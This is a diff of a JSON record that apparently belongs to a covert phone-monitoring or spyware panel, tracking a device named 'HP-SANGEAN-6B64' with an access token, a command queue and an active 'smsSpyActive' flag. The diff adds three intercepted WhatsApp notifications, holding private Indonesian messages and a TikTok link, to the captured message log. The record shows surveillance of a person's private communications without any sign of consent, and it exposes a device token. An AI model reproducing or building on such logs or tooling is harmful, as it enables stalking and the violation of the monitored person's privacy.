@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775158636527,
+    "lastSeen": 1775158639626,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "‎2 pesan baru",
+        "time": "03/04 02:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775158639771
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "Iyaa soko",
+        "time": "03/04 02:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775158639740
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "🔗 TikTok · Diva | Buka TikTok untuk menonton postingan @Diva  https://vm.tiktok.com/ZS98urA4A3je2-2uCfc/ Postingan ini dibagikan via TikTok Lite. Unduh TikTok Lite untuk menikmati postingan lainnya: https://www.tiktok.com/tiktoklite",
+        "time": "03/04 02:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775158637218
+      },
       {
         "appName": "WhatsApp",
         "sender": "🤍",
